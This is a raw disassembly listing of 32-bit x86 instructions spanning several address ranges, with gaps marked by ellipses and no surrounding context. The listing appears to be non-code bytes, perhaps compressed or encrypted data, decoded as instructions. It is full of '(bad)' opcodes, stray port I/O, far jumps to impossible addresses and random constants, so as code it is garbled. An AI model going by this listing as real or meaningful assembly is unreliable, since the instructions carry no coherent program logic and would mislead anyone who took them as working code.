  4299d6:	add    eax,0xfc870e26
  4299db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4299dc:	lods   eax,DWORD PTR ds:[esi]
  4299dd:	jb     0x429a17
  4299df:	or     edx,0xe06edada
  4299e5:	dec    eax
  4299e6:	or     eax,DWORD PTR [ebx-0x42d0ec98]
  4299ec:	mov    eax,0xac22deba
  4299f1:	jl     0x429a5b
  4299f3:	int3   
  4299f4:	je     0x429a74
  4299f6:	fmul   DWORD PTR [esi+0x4d]
  4299f9:	cld    
  4299fa:	clc    
  4299fb:	jb     0x429a30
  4299fd:	push   esi
  4299fe:	ds jg  0x429a75
  429a01:	xchg   esp,eax
  429a02:	sub    DWORD PTR [edi+0x2f8dd792],esi
  429a08:	add    al,0xc9
  429a0a:	mov    dh,0xf1
  429a0c:	jbe    0x4299e2
  429a0e:	bound  ecx,QWORD PTR [edx+0x27b157a9]
  429a14:	test   dl,cl
  429a16:	and    BYTE PTR [ebp-0x73e6a45],0x31
  429a1d:	outs   dx,DWORD PTR ds:[esi]
  429a1e:	and    eax,0x47239d3d
  429a23:	in     eax,dx
  429a24:	pop    edx
  429a25:	retf   0x14df
  429a28:	pop    ss
  429a29:	and    DWORD PTR [eax+0x30],eax
  429a2c:	push   ebp
  429a2d:	fidiv  WORD PTR [edx]
  429a2f:	ins    BYTE PTR es:[edi],dx
  429a30:	fsubr  st,st(0)
  429a32:	fst    QWORD PTR [esi-0x28]
  429a35:	cmp    eax,DWORD PTR [ecx+0x9]
  429a38:	out    dx,al
  429a39:	test   al,0x3e
  429a3b:	sbb    DWORD PTR [ecx],ebx
  429a3d:	dec    ebp
  429a3e:	fcmove st,st(7)
  429a40:	ficom  DWORD PTR ds:0x45da9c48
  429a46:	pusha  
  429a47:	mov    cl,0x8f
  429a49:	push   edx
  429a4a:	inc    ebp
  429a4b:	xor    ah,BYTE PTR [esi+0x5b5bc3b8]
  429a51:	mov    ds:0x9aef05b2,al
  429a56:	sub    BYTE PTR [ebp+ebp*1-0x6f],bh
  429a5a:	ja     0x429ab3
  429a5c:	mov    ch,0x36
  429a5e:	data16 sahf 
  429a60:	xchg   edi,eax
  429a61:	inc    eax
  429a62:	dec    esi
  429a63:	mov    edi,0xf8fd286a
  429a68:	sbb    BYTE PTR [edi-0x5c],0x2c
  429a6c:	aas    
  429a6d:	sbb    bh,cl
  429a6f:	popf   
  429a70:	clc    
  429a71:	pop    ecx
  429a72:	daa    
  429a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a74:	out    0x18,eax
  429a76:	or     BYTE PTR [ebx],bl
  429a78:	push   edi
  429a79:	adc    dl,BYTE PTR [edx+0x6d]
  429a7c:	cmp    al,0x94
  429a7e:	inc    edx
  429a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429a80:	pop    edi
  429a81:	lea    eax,[ebp-0x38320c46]
  429a87:	mov    edx,0x662da8e0
  429a8c:	ret    0xea18
  429a8f:	data16 jo 0x429a92
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x7da95667
  429b01:	sub    al,0xfd
  429b03:	aam    0x64
  429b05:	mov    esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	push   0xfffffff9
  429b0e:	mov    ah,0xca
  429b10:	mov    esi,0xf43a7d18
  429b15:	adc    eax,0xf14a5577
  429b1a:	fiadd  DWORD PTR es:[ecx-0x61]
  429b1e:	bound  esi,QWORD PTR [esi]
  429b20:	dec    eax
  429b21:	int3   
  429b22:	jae    0x429af0
  429b24:	xlat   BYTE PTR ds:[ebx]
  429b25:	xchg   esi,eax
  429b26:	mov    edx,0x26137c64
  429b2b:	adc    edi,0xda9f936c
  429b31:	and    al,0x2e
  429b33:	adc    DWORD PTR [edx],edi
  429b35:	cmp    eax,0x585e2ceb
  429b3a:	sahf   
  429b3b:	xlat   BYTE PTR ds:[ebx]
  429b3c:	sub    DWORD PTR [ebx-0x4b],ebp
  429b3f:	adc    eax,0xec0211a0
  429b44:	neg    DWORD PTR [ecx+edi*1+0x7071ae55]
  429b4b:	sub    DWORD PTR [ecx],ebp
  429b4d:	ds pop ss
  429b4f:	add    DWORD PTR [esi],eax
  429b51:	dec    esi
  429b52:	push   esp
  429b53:	adc    eax,0x6f9adc5a
  429b58:	fstp   TBYTE PTR [ebp-0x24169003]
  429b5e:	sbb    eax,0x433891be
  429b63:	pusha  
  429b64:	pop    ebx
  429b65:	mov    ah,BYTE PTR [ebp-0x9269a9e]
  429b6b:	add    dh,BYTE PTR [esi+0x5]
  429b6e:	pop    edx
  429b6f:	add    eax,0xb01b89c1
  429b74:	pop    ebx
  429b75:	repnz inc ebp
  429b77:	popf   
  429b78:	in     al,dx
  429b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b7a:	mov    bh,0x76
  429b7c:	std    
  429b7d:	and    BYTE PTR [esi+edi*2-0x47],bh
  429b81:	cdq    
  429b82:	mov    ebp,0x9a8bbe58
  429b87:	xlat   BYTE PTR ds:[ebx]
  429b88:	(bad)  
  429b89:	mov    ecx,0x1fae05be
  429b8e:	dec    ecx
  429b8f:	and    DWORD PTR [eax],0x8726ae90
  429b95:	or     dl,BYTE PTR [edx+0x6742748b]
  429b9b:	call   0xaecb:0xf4fc5fa2
  429ba2:	aam    0xbd
  429ba4:	or     BYTE PTR ds:0xd2ad870d,al
  429baa:	sbb    al,0xa1
  429bac:	stos   DWORD PTR es:[edi],eax
  429bad:	scas   eax,DWORD PTR es:[edi]
  429bae:	(bad)  
  429bb0:	dec    esp
  429bb1:	pop    ecx
  429bb2:	aad    0x50
  429bb4:	jbe    0x429ba5
  429bb6:	jl     0x429b4c
  429bb8:	fistp  DWORD PTR [ebp-0x33]
  429bbb:	cmp    eax,0xb6c66ae1
  429bc0:	sbb    al,0x22
  429bc2:	sub    DWORD PTR [edx],edx
  429bc4:	ja     0x429b9f
  429bc6:	cld    
  429bc7:	sbb    eax,0xfd9d2acb
  429bcc:	popf   
  429bcd:	add    al,0x2
  429bcf:	mov    BYTE PTR [eax-0x12],ch
  429bd2:	mov    ebx,0x187373de
  429bd7:	shl    BYTE PTR [ebp+0x57ad4cd6],0xb6
  429bde:	lods   al,BYTE PTR ds:[esi]
  429bdf:	jp     0x429c5e
  429be1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429be2:	fst    DWORD PTR [ecx]
  429be4:	data16 jnp 0x429c53
  429be7:	outs   dx,DWORD PTR ds:[esi]
  429be8:	inc    esi
  429be9:	mov    ss,esi
  429beb:	adc    eax,0x9c5fd182
  429bf0:	or     al,BYTE PTR [ebx+ebx*2+0x757ee07]
  429bf7:	add    al,cl
  429bf9:	enter  0x3c18,0xfc
  429bfd:	popf   
  429bfe:	bound  edx,QWORD PTR [edi-0x2c]
  429c01:	pop    edi
  429c02:	cdq    
  429c03:	xor    dl,BYTE PTR [eax-0x1a]
  429c06:	cmp    ebx,DWORD PTR [esi+0x79f64535]
  429c0c:	in     al,dx
  429c0d:	fwait
  429c0e:	scas   al,BYTE PTR es:[edi]
  429c0f:	iret   
  429c10:	cmp    BYTE PTR [eax],al
	...
  429c72:	add    BYTE PTR [eax],al
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    al,ch
  429c81:	sti    
  429c82:	push   esi
  429c83:	mov    ds:0x1bf69,al
  429c88:	add    eax,0xce000001
  429c8d:	rol    BYTE PTR es:0x2c0a5e6f,cl
  429c94:	xor    DWORD PTR [edi+ebx*1],ecx
  429c97:	mov    BYTE PTR [edx+0x76],dh
  429c9a:	enter  0x7fec,0x3d
  429c9e:	out    dx,eax
  429c9f:	push   edx
  429ca0:	in     al,0x24
  429ca2:	xor    eax,0x6cd8ad94
  429ca7:	sub    al,0x7b
  429ca9:	jb     0x429d16
  429cab:	inc    ebp
  429cac:	sbb    ecx,DWORD PTR [ebp-0x42]
  429caf:	mov    BYTE PTR [eax],bl
  429cb1:	sbb    BYTE PTR [ebp-0x3a10dcdb],bl
  429cb7:	int3   
  429cb8:	xchg   ebp,eax
  429cb9:	cmp    al,0x91
  429cbb:	or     DWORD PTR [edi+0x2a25b685],edx
  429cc1:	in     eax,dx
  429cc2:	out    0x5f,al
  429cc4:	dec    esi
  429cc5:	int3   
  429cc6:	iret   
  429cc7:	lea    eax,[eax]
  429cc9:	jo     0x429cdf
  429ccb:	dec    eax
  429ccc:	adc    eax,0x7a96aca5
  429cd1:	xchg   BYTE PTR [edi],ah
  429cd3:	jge    0x429d3f
  429cd5:	pop    ebp
  429cd6:	out    0x51,eax
  429cd8:	retf   
  429cd9:	lods   al,BYTE PTR ds:[esi]
  429cda:	cli    
  429cdb:	dec    eax
  429cdc:	mov    ecx,0x2ba90a85
  429ce1:	pushf  
  429ce2:	xchg   ebp,eax
  429ce3:	cs loope 0x429cc1
  429ce6:	scas   al,BYTE PTR es:[edi]
  429ce7:	nop    DWORD PTR [edi]
  429cea:	mov    edx,0xb4ed7bd
  429cef:	push   edx
  429cf0:	adc    DWORD PTR [edx+0x44e95ac1],ecx
  429cf6:	dec    edi
  429cf7:	cmp    DWORD PTR ds:0x4759311f,esp
  429cfd:	push   ss
  429cfe:	add    al,0x16
  429d00:	pop    ds
  429d01:	inc    ebx
  429d02:	fstp   DWORD PTR [esi-0x49]
  429d05:	out    0xc4,al
  429d07:	mov    al,ds:0x20f087a1
  429d0c:	and    BYTE PTR [edx-0xc],ch
  429d0f:	add    eax,0xb0a6a608
  429d14:	add    DWORD PTR [edx+0x597ee817],ecx
  429d1a:	mov    DWORD PTR [eax+0x4560cf28],0xf0ddd528
  429d24:	(bad)  
  429d25:	in     al,dx
  429d26:	mov    esp,0x31e6531f
  429d2b:	hlt    
  429d2c:	push   esi
  429d2d:	and    eax,0x2f55c343
  429d32:	xor    BYTE PTR [edx],al
  429d34:	sub    BYTE PTR ds:0x4bfd77a2,cl
  429d3a:	daa    
  429d3b:	jbe    0x429d4d
  429d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d3e:	into   
  429d3f:	lock (bad) [ecx-0x22dd234a]
  429d46:	out    dx,eax
  429d47:	outs   dx,BYTE PTR ds:[esi]
  429d48:	mov    bl,bh
  429d4a:	mov    bl,0xc
  429d4c:	mov    dh,0x9c
  429d4e:	sub    ecx,edx
  429d50:	loop   0x429dc4
  429d52:	inc    ecx
  429d53:	push   0x35
  429d55:	xchg   esp,eax
  429d57:	sbb    ebp,DWORD PTR [ebp-0x5]
  429d5a:	mov    ecx,0xcd27a89b
  429d5f:	dec    eax
  429d60:	xor    al,0xec
  429d62:	cmp    eax,0x29c9bb29
  429d67:	dec    esi
  429d68:	cwde   
  429d69:	jns    0x429cee
  429d6b:	(bad)  
  429d6c:	mov    cl,0x31
  429d6e:	and    eax,0xaf15a677
  429d73:	vxorpd xmm7,xmm5,XMMWORD PTR [eax+0x5a]
  429d78:	loopne 0x429d77
  429d7a:	fiadd  DWORD PTR ds:0xc7a3830f
  429d80:	push   ds
  429d81:	jbe    0x429d06
  429d83:	cld    
  429d84:	les    esi,FWORD PTR [edi-0x2b]
  429d87:	fnsave [edx+0xd17c98a]
  429d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d8e:	fisttp WORD PTR [edx+0x3]
	...
  429df1:	add    BYTE PTR [eax],al
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	inc    ebp
  429e01:	out    0x47,eax
  429e03:	outs   dx,BYTE PTR ds:[esi]
  429e04:	outs   dx,BYTE PTR ds:[esi]
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x78000001
  429e0d:	cmp    eax,0x6cbd9db3
  429e12:	xchg   BYTE PTR [edi-0x60e94776],al
  429e18:	or     BYTE PTR fs:[ebx+eax*8+0x592adb37],bl
  429e20:	sbb    BYTE PTR [edx-0xedffb7],0x71
  429e27:	lds    edx,FWORD PTR [edi]
  429e29:	ins    DWORD PTR es:[edi],dx
  429e2a:	inc    cx
  429e2c:	pop    ebx
  429e2d:	(bad)  [eax+0x4f]
  429e30:	imul   ebp,DWORD PTR ds:0x1677d2a1,0x9e75e082
  429e3a:	jle    0x429dd1
  429e3c:	mov    cl,0x8f
  429e3e:	dec    ecx
  429e3f:	dec    esi
  429e40:	mov    esi,cs
  429e42:	jge    0x429e82
  429e44:	push   ebx
  429e45:	sbb    bh,BYTE PTR [eax+0x15]
  429e48:	int    0x41
  429e4a:	fstp   TBYTE PTR [edx]
  429e4c:	jae    0x429ea3
  429e4e:	int    0x25
  429e50:	mov    WORD PTR [ebp+0x5f],gs
  429e53:	jbe    0x429ec2
  429e55:	push   ebx
  429e56:	sub    DWORD PTR [edi-0x156187f],0xffffffa1
  429e5d:	aad    0xe0
  429e5f:	ret    
  429e60:	jle    0x429ecd
  429e62:	xchg   DWORD PTR [esi+0x1f99b597],ebx
  429e68:	jae    0x429ed7
  429e6a:	rol    edi,1
  429e6c:	xchg   ebp,eax
  429e6d:	and    DWORD PTR [esi-0x25bf5c85],edx
  429e73:	sar    DWORD PTR [ebp+eax*8-0x79f018de],0x60
  429e7b:	pop    esi
  429e7c:	xchg   DWORD PTR [eax-0x3f],ebx
  429e7f:	int    0xa5
  429e81:	push   0x27
  429e83:	and    cl,bl
  429e85:	jns    0x429e6e
  429e87:	in     eax,0x27
  429e89:	dec    ebx
  429e8a:	repnz push 0x22d566ba
  429e90:	(bad)  
  429e91:	xor    edx,ebx
  429e93:	jle    0x429f11
  429e95:	xlat   BYTE PTR ds:[ebx]
  429e96:	sahf   
  429e97:	and    DWORD PTR [esi+0x508fdc05],esp
  429e9d:	imul   eax,DWORD PTR [ebp+esi*4+0x4d555cce],0xffffffa8
  429ea5:	xchg   edi,eax
  429ea6:	xor    BYTE PTR [ebp+0x52],al
  429ea9:	push   ds
  429eaa:	pop    edx
  429eab:	sub    BYTE PTR [ebx],bl
  429ead:	(bad)  
  429eae:	mov    ds,WORD PTR [edi]
  429eb0:	xchg   esi,eax
  429eb1:	adc    al,0xb9
  429eb3:	xchg   DWORD PTR [eax],edx
  429eb5:	jp     0x429e55
  429eb7:	rol    edx,0x9b
  429eba:	and    al,0xec
  429ebc:	xchg   DWORD PTR [ebp+0x64],ecx
  429ebf:	or     eax,0x5fd9b757
  429ec4:	sti    
  429ec5:	je     0x429f19
  429ec7:	cmp    dl,BYTE PTR [ebp+0x3339a548]
  429ecd:	mov    DWORD PTR ss:0xdf562323,ebp
  429ed4:	sti    
  429ed5:	pop    edx
  429ed6:	cdq    
  429ed7:	ja     0x429f4b
  429ed9:	xchg   BYTE PTR [esi+ebp*1],ch
  429edc:	push   eax
  429edd:	pop    esi
  429ede:	adc    ebp,edx
  429ee0:	cdq    
  429ee1:	xor    BYTE PTR [edi],bl
  429ee3:	jmp    0x96b80b08
  429ee8:	cmp    dh,dl
  429eea:	sti    
  429eeb:	dec    edx
  429eec:	outs   dx,DWORD PTR ds:[esi]
  429eed:	fdivr  QWORD PTR [edi]
  429eef:	popa   
  429ef0:	popf   
  429ef1:	dec    ebp
  429ef2:	push   edi
  429ef3:	or     ebx,ebp
  429ef5:	and    ch,al
  429ef7:	mov    bl,0xc
  429ef9:	push   edi
  429efa:	mov    ebp,0xd4a4ea75
  429eff:	pop    ss
  429f00:	pop    es
  429f01:	jbe    0x429e9e
  429f03:	jp     0x429ee9
  429f05:	mov    bl,0x6a
  429f07:	xor    al,0xe1
  429f09:	sub    eax,0x278377c8
  429f0e:	push   0x4
  429f10:	push   edx
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x62483628]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x84000001
  429f8d:	out    dx,eax
  429f8e:	pop    edi
  429f8f:	cmp    al,0xe2
  429f91:	xchg   ecx,eax
  429f93:	or     eax,0xa9c688ad
  429f98:	lock or eax,DWORD PTR [bp+di]
  429f9c:	jne    0x429f25
  429f9e:	rcr    ah,1
  429fa0:	push   esp
  429fa1:	jns    0x429f8b
  429fa3:	fcom   QWORD PTR [edx+edi*8]
  429fa6:	push   es
  429fa7:	xor    eax,0x5f33e864
  429fac:	sbb    DWORD PTR [ecx-0x7e],ebp
  429faf:	xor    bh,BYTE PTR [ecx+0x3d713b31]
  429fb5:	cmp    al,0x41
  429fb7:	popf   
  429fb8:	jecxz  0x429ff5
  429fba:	adc    BYTE PTR [ebx],dh
  429fbc:	aas    
  429fbd:	sub    eax,0x2f8b7092
  429fc2:	sub    al,cl
  429fc4:	cmc    
  429fc5:	dec    ebx
  429fc6:	dec    ebx
  429fc7:	xlat   BYTE PTR ds:[ebx]
  429fc8:	xchg   BYTE PTR ds:0x49278da0,cl
  429fce:	outs   dx,DWORD PTR ds:[esi]
  429fcf:	push   0x4
  429fd1:	or     al,0x94
  429fd3:	jno    0x429f95
  429fd5:	cdq    
  429fd6:	jnp    0x429fe5
  429fd8:	imul   edx,DWORD PTR [esi-0xa3353f],0x66b040fb
  429fe2:	mov    esp,0x8293ec86
  429fe7:	mov    ebx,0x8e2f6ddc
  429fec:	loop   0x429fd3
  429fee:	push   eax
  429fef:	test   eax,0x14679bb8
  429ff4:	sahf   
  429ff5:	pop    eax
  429ff6:	(bad)  
  429ff7:	xchg   esp,eax
  429ff8:	shr    BYTE PTR [edx-0x57393e3d],0xb5
  429fff:	pop    esp
  42a000:	xchg   BYTE PTR [ecx+0x1f],dh
  42a003:	lods   eax,DWORD PTR ds:[esi]
  42a004:	ficom  WORD PTR [ecx+ebp*2]
  42a007:	push   eax
  42a008:	mov    ds,WORD PTR [eax+eax*2]
  42a00b:	cmp    DWORD PTR [edx+ebx*2],0xffffff96
  42a00f:	mov    bl,0xeb
  42a011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a012:	push   ecx
  42a013:	cmp    eax,DWORD PTR [edx+edx*4+0x811e12f]
  42a01a:	add    eax,0x1107cdaa
  42a01f:	adc    BYTE PTR [esi-0x69],bl
  42a022:	clc    
  42a023:	scas   eax,DWORD PTR es:[edi]
  42a024:	shl    al,cl
  42a026:	or     ch,bl
  42a028:	rol    esi,cl
  42a02a:	aad    0xaf
  42a02c:	push   esp
  42a02d:	rcl    BYTE PTR [ebx+0x5],1
  42a030:	cmp    al,al
  42a032:	dec    edi
  42a033:	jb     0x429fd8
  42a035:	(bad)  
  42a036:	mov    ss,WORD PTR [ecx+0x1f]
  42a039:	pop    ss
  42a03a:	(bad)  
  42a03b:	dec    eax
  42a03c:	mov    al,ds:0x87527da2
  42a041:	stc    
  42a042:	sub    bh,BYTE PTR [eax-0x58]
  42a045:	sub    esp,esp
  42a047:	mov    ds:0x9374e683,al
  42a04c:	push   ebp
  42a04d:	aas    
  42a04e:	test   BYTE PTR [edi-0x4cca2152],bl
  42a054:	sub    BYTE PTR [edx],0xa3
  42a057:	iret   
  42a058:	pop    ecx
  42a059:	loope  0x42a06c
  42a05b:	shr    DWORD PTR [edi],0x72
  42a05e:	inc    edi
  42a05f:	out    0x6f,al
  42a061:	repz ror dh,1
  42a064:	pushf  
  42a065:	and    eax,0x32b45ee
  42a06a:	not    BYTE PTR [edi]
  42a06c:	inc    eax
  42a06d:	test   DWORD PTR [ebp+0x68],ebp
  42a070:	(bad)  
  42a071:	jle    0x42a06e
  42a073:	and    esp,DWORD PTR [edi]
  42a075:	jge    0x42a0b5
  42a077:	and    eax,DWORD PTR [esp+ecx*2-0x1d]
  42a07b:	in     al,0x1a
  42a07d:	cmp    eax,0x1f9e878e
  42a082:	push   0x6ed1f36f
  42a087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a088:	scas   eax,DWORD PTR es:[edi]
  42a089:	aas    
  42a08a:	and    ebx,esp
  42a08c:	push   es
  42a08d:	mov    es,eax
  42a08f:	test   bh,dl
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	mov    al,ds:0x78c6ac84
  42a105:	ret    0x1
  42a108:	add    eax,0x3d000001
  42a10d:	xor    BYTE PTR [edx],al
  42a10f:	scas   eax,DWORD PTR es:[edi]
  42a110:	cmp    ebp,DWORD PTR [edx+0x13]
  42a113:	xchg   ebx,eax
  42a114:	pop    esi
  42a115:	push   0x30c9fa6
  42a11a:	and    al,BYTE PTR [edi-0x81e2cec]
  42a120:	out    0x2b,eax
  42a122:	jmp    0xe5528a54
  42a127:	retf   
  42a128:	cmp    dh,BYTE PTR [edi+0x621316c3]
  42a12e:	sub    bh,BYTE PTR [ecx-0x72]
  42a131:	(bad)  [eax+0x606bac6b]
  42a137:	xlat   BYTE PTR ds:[ebx]
  42a138:	in     al,dx
  42a139:	mov    ds:0xcbe9eeee,al
  42a13e:	and    eax,0xa2048f31
  42a143:	mov    esi,DWORD PTR [eax]
  42a145:	mov    BYTE PTR [edi+0x71e5ec1d],ah
  42a14b:	cwde   
  42a14c:	mov    esp,0x266faba6
  42a151:	rcl    edi,1
  42a153:	pop    edi
  42a154:	(bad)  
  42a156:	sbb    eax,0x932b68ba
  42a15b:	out    0x29,al
  42a15d:	push   ds
  42a15e:	and    dl,cl
  42a160:	aam    0xdd
  42a162:	mov    bh,0xea
  42a164:	pop    esp
  42a165:	test   al,0x8a
  42a167:	and    esp,DWORD PTR [eax-0x3c]
  42a16a:	xchg   ebx,edi
  42a16c:	retf   
  42a16d:	popf   
  42a16e:	or     eax,0x54d1d9c0
  42a173:	cmp    dh,BYTE PTR ds:0x3af178c6
  42a179:	push   ecx
  42a17a:	fisub  WORD PTR [ecx+0x7dc507c4]
  42a180:	lods   eax,DWORD PTR ds:[esi]
  42a181:	out    dx,al
  42a182:	leave  
  42a183:	jl     0x42a18b
  42a185:	mov    al,0xd5
  42a187:	push   eax
  42a188:	xor    bh,ch
  42a18a:	lock clc 
  42a18c:	push   edi
  42a18d:	mov    dl,0xc0
  42a18f:	mov    ebx,0xd7763505
  42a194:	nop
  42a195:	and    al,0xae
  42a197:	push   es
  42a198:	jns    0x42a191
  42a19a:	pusha  
  42a19b:	jae    0x42a1b0
  42a19d:	shl    ebp,0xf
  42a1a0:	cmp    ebx,ecx
  42a1a2:	icebp  
  42a1a3:	adc    BYTE PTR [edx-0x7d],dl
  42a1a6:	mov    bh,0x8d
  42a1a8:	xchg   BYTE PTR ds:0x278714df,ch
  42a1ae:	imul   edi,eax,0xffffff88
  42a1b1:	(bad)  
  42a1b3:	xor    BYTE PTR [edi+ebp*1+0x23],ch
  42a1b7:	lods   al,BYTE PTR ds:[esi]
  42a1b8:	xchg   esi,eax
  42a1b9:	mov    esp,0x63750dd1
  42a1be:	nop
  42a1bf:	clc    
  42a1c0:	mov    BYTE PTR [edx+0x5d],bh
  42a1c3:	iret   
  42a1c4:	mov    BYTE PTR [edi-0x59121fae],al
  42a1ca:	sub    al,0x3d
  42a1cc:	or     eax,0xa7cd0a9
  42a1d1:	in     eax,0xd4
  42a1d3:	ss push ecx
  42a1d5:	(bad)  
  42a1d6:	popa   
  42a1d7:	push   ds
  42a1d8:	(bad)  
  42a1d9:	adc    esi,ebp
  42a1db:	inc    edi
  42a1dc:	fisttp QWORD PTR [edx+ecx*2]
  42a1e0:	je     0x42a239
  42a1e2:	push   edx
  42a1e3:	adc    DWORD PTR [eax],ecx
  42a1e5:	shr    BYTE PTR [ebx+0x4dd0b1dd],cl
  42a1eb:	inc    edx
  42a1ec:	ret    
  42a1ed:	jbe    0x42a201
  42a1ef:	jmp    0x42a250
  42a1f1:	jae    0x42a206
  42a1f3:	das    
  42a1f4:	inc    ebx
  42a1f5:	xchg   ecx,eax
  42a1f6:	out    dx,al
  42a1f7:	mov    bh,0xc4
  42a1f9:	popf   
  42a1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1fb:	mov    dh,0x9
  42a1fd:	mov    dl,0x50
  42a1ff:	cwde   
  42a200:	add    eax,edx
  42a202:	dec    eax
  42a203:	out    0x98,al
  42a205:	repz add dh,bl
  42a208:	enter  0x4e1c,0x5f
  42a20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a20d:	es hlt 
  42a20f:	dec    ebp
  42a210:	popa   
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fst    DWORD PTR [edi+0x7dbe6233]
  42a285:	ret    
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0x48000001
  42a28d:	and    al,0xb2
  42a28f:	xor    DWORD PTR [ecx-0x2b],esp
  42a292:	add    DWORD PTR [esi+ebp*8],ebx
  42a295:	push   ebx
  42a296:	mov    dh,0x6f
  42a298:	in     al,dx
  42a299:	dec    ebx
  42a29a:	pop    ebx
  42a29b:	pop    eax
  42a29c:	es pop eax
  42a29e:	mov    esp,DWORD PTR [edi-0x35693a90]
  42a2a4:	sbb    eax,0xcd54968c
  42a2a9:	sbb    DWORD PTR [edi+0x83df6b6],edi
  42a2af:	in     al,0xff
  42a2b1:	xor    ebp,DWORD PTR ds:0x5126962e
  42a2b7:	shl    BYTE PTR [edi+edi*8],cl
  42a2ba:	jle    0x42a332
  42a2bc:	outs   dx,DWORD PTR ds:[esi]
  42a2bd:	mov    esi,0x955d7fda
  42a2c2:	gs sub esi,eax
  42a2c5:	or     cl,bh
  42a2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2c8:	sub    ecx,DWORD PTR [edi-0x29]
  42a2cb:	jmp    0xb435:0xacec95c6
  42a2d2:	sbb    dh,BYTE PTR [ebx-0x5660de88]
  42a2d8:	and    ebp,DWORD PTR [ebp-0x46b8b9ae]
  42a2de:	int3   
  42a2df:	xchg   ebp,ebx
  42a2e1:	jp     0x42a2dc
  42a2e3:	or     al,0x5e
  42a2e5:	cmp    ecx,0xffffffd3
  42a2e8:	sub    al,0xb7
  42a2ea:	xchg   ebx,eax
  42a2eb:	mov    edi,0x236cdaae
  42a2f0:	pop    ss
  42a2f1:	dec    edi
  42a2f2:	fstp   TBYTE PTR [ebp-0x2]
  42a2f5:	ins    BYTE PTR es:[edi],dx
  42a2f6:	(bad)  [ebx-0xc322227]
  42a2fc:	(bad)  
  42a2fd:	fstp   DWORD PTR [ecx+0xf]
  42a300:	mov    edi,0xbc6d159b
  42a305:	fst    QWORD PTR [edx+0x35]
  42a308:	pop    ebx
  42a309:	leave  
  42a30a:	adc    al,0x3e
  42a30c:	xchg   esi,eax
  42a30d:	adc    eax,0xb78b8e32
  42a312:	in     al,dx
  42a313:	cwde   
  42a314:	and    al,0xd9
  42a316:	jbe    0x42a38e
  42a318:	mov    cs,WORD PTR [ecx]
  42a31a:	mov    cs,WORD PTR [edi-0x7debf7dd]
  42a320:	sar    BYTE PTR [edi],cl
  42a322:	xchg   esp,eax
  42a323:	sub    cl,BYTE PTR [edx+0x4bf4a249]
  42a329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a32a:	ins    DWORD PTR es:[edi],dx
  42a32b:	pop    esp
  42a32c:	aad    0x25
  42a32e:	ror    BYTE PTR [ebx],1
  42a330:	jne    0x42a367
  42a332:	cmp    BYTE PTR [eax-0x53],al
  42a335:	push   edx
  42a336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a337:	xchg   edx,eax
  42a338:	xlat   BYTE PTR ds:[ebx]
  42a339:	sbb    ebx,eax
  42a33b:	lods   al,BYTE PTR ds:[esi]
  42a33c:	sti    
  42a33d:	push   eax
  42a33e:	js     0x42a384
  42a340:	lods   eax,DWORD PTR ds:[esi]
  42a341:	popa   
  42a342:	xchg   esp,eax
  42a343:	or     edx,esi
  42a345:	push   esp
  42a346:	ret    0x6e85
  42a349:	popf   
  42a34a:	jp     0x42a2ff
  42a34c:	sbb    eax,0xb61df11
  42a351:	jge    0x42a368
  42a353:	ins    DWORD PTR es:[edi],dx
  42a354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a355:	jp     0x42a344
  42a357:	cmp    dh,al
  42a359:	push   es
  42a35a:	test   BYTE PTR [edi+0x2302f05b],dh
  42a360:	int3   
  42a361:	out    0x3a,eax
  42a363:	mov    edi,0xea6cceef
  42a368:	(bad)  
  42a369:	or     BYTE PTR [ebx-0x6fff3978],bh
  42a36f:	repz fnstsw WORD PTR [ecx-0x35]
  42a373:	fadd   DWORD PTR [eax-0x32]
  42a376:	or     edi,edi
  42a378:	dec    ecx
  42a379:	inc    edx
  42a37a:	mov    al,0xb3
  42a37c:	mov    bl,BYTE PTR ds:0xdaee8afd
  42a382:	xchg   ah,al
  42a384:	call   0x804a6466
  42a389:	dec    edi
  42a38a:	std    
  42a38b:	or     DWORD PTR [ebx],edx
  42a38d:	mov    ebp,0xdb2952
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
